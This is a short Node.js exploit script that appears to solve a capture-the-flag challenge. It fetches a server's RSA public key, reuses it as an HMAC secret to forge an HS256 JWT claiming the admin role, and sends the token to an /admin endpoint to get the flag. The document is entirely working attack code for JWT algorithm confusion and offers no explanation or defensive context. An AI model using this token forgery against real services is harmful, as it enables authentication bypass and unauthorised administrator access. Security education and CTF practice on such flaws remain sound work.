const jwt = require('jsonwebtoken');
const axios = require('axios');

async function exploit() {
  try {
    const { data: publicKey } = await axios.get('http://chals.bitskrieg.in:3005/public-key');
    const cleanPublicKey = publicKey
      .replace(/-----BEGIN PUBLIC KEY-----/g, '')
      .replace(/-----END PUBLIC KEY-----/g, '')
      .replace(/\n/g, '')
      .trim();
    const hmacSecret = Buffer.from(cleanPublicKey, 'base64');

    const forgedToken = jwt.sign(
      {
        username: 'admin',
        role: 'admin',
        iat: Math.floor(Date.now() / 1000)
      },
      hmacSecret,
      {
        algorithm: 'HS256',
        header: {
          typ: 'JWT',
          alg: 'HS256'
        }
      }
    );
    const response = await axios.get('http://chals.bitskrieg.in:3005/admin', {
      headers: {
        Authorization: `Bearer ${forgedToken}`
      }
    });

    console.log('Success! Flag:', response.data.flag);
  } catch (error) {
    console.error('Failure:', error.response?.data || error.message);
  }
}

exploit();
